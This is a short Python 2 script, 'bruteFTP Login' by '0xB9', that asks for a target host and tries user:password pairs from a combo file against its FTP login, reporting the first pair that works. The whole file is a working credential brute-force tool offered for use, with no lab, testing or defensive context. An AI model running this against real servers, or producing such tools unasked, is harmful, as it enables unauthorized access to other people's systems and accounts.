#!/usr/bin/python
import ftplib
import time


print "bruteFTP Login"
print "Made By: 0xB9\n"
time.sleep(1)

host = raw_input("Enter A Host-> ")

def bruteFTP(hostname, comboList):
    c = open(comboList, 'r')
    for line in c.readlines():
        user = line.split(':')[0]
        pwd = line.split(':')[1].strip('\r').strip('\n')
        print "[*] Testing: "+user+":"+pwd

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user, pwd)
            print "\n[+] "+str(hostname)+" FTP Login: "+user+":"+pwd
            ftp.quit()
            return (user, pwd)
        except Exception, e:
            pass

    print "\n[-] Couldn\'t brute force FTP login..."
    return (None, None)

comboList = 'combo.txt'
bruteFTP(host, comboList)
